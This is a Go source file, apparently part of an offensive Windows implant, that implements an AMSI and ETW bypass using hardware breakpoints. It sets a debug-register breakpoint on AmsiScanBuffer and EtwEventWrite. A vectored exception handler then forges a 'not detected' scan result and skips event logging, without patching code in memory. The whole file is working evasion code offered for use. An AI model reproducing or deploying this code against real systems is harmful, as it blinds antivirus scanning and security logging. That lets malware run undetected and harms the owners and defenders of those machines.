//go:build windows && amd64

package main

import (
	"syscall"
	"unsafe"
)

// AMSI and ETW Bypass via Hardware Breakpoints
//
// Sets a hardware execute breakpoint (DR0 + DR7) on AmsiScanBuffer /
// EtwEventWrite. A VEH intercepts EXCEPTION_SINGLE_STEP, writes a clean
// result, and returns from the function without patching .text.
//
// Use when memory-patch AMSI/ETW is risky (page-guard / integrity checks).
// Only the thread that installed the BP is covered. Requires Windows AMD64.

var (
	hwbpKernel32 = syscall.NewLazyDLL("kernel32.dll")
	hwbpGetMod   = hwbpKernel32.NewProc("GetModuleHandleW")
	hwbpLoadLib  = hwbpKernel32.NewProc("LoadLibraryW")
	hwbpGetProc  = hwbpKernel32.NewProc("GetProcAddress")
	hwbpAddVEH   = hwbpKernel32.NewProc("AddVectoredExceptionHandler")
	hwbpGetThr   = hwbpKernel32.NewProc("GetCurrentThread")
	hwbpGetCtx   = hwbpKernel32.NewProc("GetThreadContext")
	hwbpSetCtx   = hwbpKernel32.NewProc("SetThreadContext")

	hwbpVEH  uintptr
	hwbpAmsi uintptr
	hwbpEtw  uintptr
)

const (
	hwbpExceptionSingleStep = 0x80000004
	hwbpContinueExecution   = ^uintptr(0) // EXCEPTION_CONTINUE_EXECUTION
	hwbpContinueSearch      = 0
	hwbpContextAMD64        = 0x00100000
	hwbpContextControl      = 0x00000001
	hwbpContextDebugRegs    = 0x00000010
	hwbpAMSIResultClean     = 1 // AMSI_RESULT_NOT_DETECTED
)

// hwbpCONTEXT is the AMD64 CONTEXT layout from winnt.h (offsets must match
// the kernel). VectorRegister[26] is required so Rax/Rsp/Rip sit at the
// documented offsets.
type hwbpCONTEXT struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	ContextFlags                                   uint32
	MxCsr                                          uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs       uint16
	EFlags                                         uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                   uint64
	FltSave                                        [512]byte
	VectorRegister                                 [26][16]byte
	VectorControl                                  uint64
	DebugControl                                   uint64
	LastBranchToRip                                uint64
	LastBranchFromRip                              uint64
	LastExceptionToRip                             uint64
	LastExceptionFromRip                           uint64
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi         uint64
	R8, R9, R10, R11, R12, R13, R14, R15           uint64
	Rip                                            uint64
}

type hwbpExceptionRecord struct {
	Code         uint32
	Flags        uint32
	Record       uintptr
	Address      uintptr
	NumberParams uint32
	Params       [15]uintptr
}

type hwbpExceptionPointers struct {
	ExceptionRecord uintptr
	ContextRecord   uintptr
}

func hwbpResolve(mod, proc string) uintptr {
	mod16, _ := syscall.UTF16PtrFromString(mod)
	h, _, _ := hwbpGetMod.Call(uintptr(unsafe.Pointer(mod16)))
	if h == 0 {
		h, _, _ = hwbpLoadLib.Call(uintptr(unsafe.Pointer(mod16)))
	}
	if h == 0 {
		return 0
	}
	name := append([]byte(proc), 0)
	p, _, _ := hwbpGetProc.Call(h, uintptr(unsafe.Pointer(&name[0])))
	return p
}

func hwbpEnsureVEH() bool {
	if hwbpVEH != 0 {
		return true
	}
	cb := syscall.NewCallback(hwbpVEHHandler)
	h, _, _ := hwbpAddVEH.Call(1, cb)
	if h == 0 {
		return false
	}
	hwbpVEH = h
	return true
}

func hwbpVEHHandler(ep uintptr) uintptr {
	ptrs := (*hwbpExceptionPointers)(unsafe.Pointer(ep))
	if ptrs.ExceptionRecord == 0 || ptrs.ContextRecord == 0 {
		return hwbpContinueSearch
	}
	rec := (*hwbpExceptionRecord)(unsafe.Pointer(ptrs.ExceptionRecord))
	if rec.Code != hwbpExceptionSingleStep {
		return hwbpContinueSearch
	}
	ctx := (*hwbpCONTEXT)(unsafe.Pointer(ptrs.ContextRecord))
	rip := uintptr(ctx.Rip)
	switch rip {
	case hwbpAmsi:
		// AmsiScanBuffer: 6th arg (result*) is at RSP+0x30 on AMD64.
		if ctx.Rsp != 0 {
			resPtr := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp + 0x30)))
			if resPtr != 0 {
				*(*uint32)(unsafe.Pointer(uintptr(resPtr))) = hwbpAMSIResultClean
			}
		}
		ctx.Rax = 0 // S_OK
		ret := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rip = ret
		ctx.Rsp += 8
		return hwbpContinueExecution
	case hwbpEtw:
		ctx.Rax = 0 // STATUS_SUCCESS
		ret := *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rip = ret
		ctx.Rsp += 8
		return hwbpContinueExecution
	default:
		return hwbpContinueSearch
	}
}

func hwbpArmCurrentThread(addr uintptr) error {
	h, _, _ := hwbpGetThr.Call()
	var ctx hwbpCONTEXT
	ctx.ContextFlags = hwbpContextAMD64 | hwbpContextControl | hwbpContextDebugRegs
	if ret, _, err := hwbpGetCtx.Call(h, uintptr(unsafe.Pointer(&ctx))); ret == 0 {
		return err
	}
	ctx.Dr0 = uint64(addr)
	// Local enable DR0, execute breakpoint, 1-byte length.
	ctx.Dr7 = (ctx.Dr7 &^ 0xF000F) | 0x1
	ctx.ContextFlags = hwbpContextAMD64 | hwbpContextControl | hwbpContextDebugRegs
	if ret, _, err := hwbpSetCtx.Call(h, uintptr(unsafe.Pointer(&ctx))); ret == 0 {
		return err
	}
	return nil
}

func HardwareBreakpointAMSI() string {
	if !hwbpEnsureVEH() {
		return "HWBP AMSI: failed to register VEH"
	}
	addr := hwbpResolve("amsi.dll", "AmsiScanBuffer")
	if addr == 0 {
		return "HWBP AMSI: AmsiScanBuffer not found (amsi.dll not loaded)"
	}
	hwbpAmsi = addr
	if err := hwbpArmCurrentThread(addr); err != nil {
		return "HWBP AMSI: SetThreadContext failed: " + err.Error()
	}
	return "HWBP AMSI: DR0 armed on AmsiScanBuffer (this thread; AMSI_RESULT_NOT_DETECTED)"
}

func HardwareBreakpointETW() string {
	if !hwbpEnsureVEH() {
		return "HWBP ETW: failed to register VEH"
	}
	addr := hwbpResolve("ntdll.dll", "EtwEventWrite")
	if addr == 0 {
		return "HWBP ETW: EtwEventWrite not found"
	}
	hwbpEtw = addr
	if err := hwbpArmCurrentThread(addr); err != nil {
		return "HWBP ETW: SetThreadContext failed: " + err.Error()
	}
	return "HWBP ETW: DR0 armed on EtwEventWrite (this thread; STATUS_SUCCESS)"
}
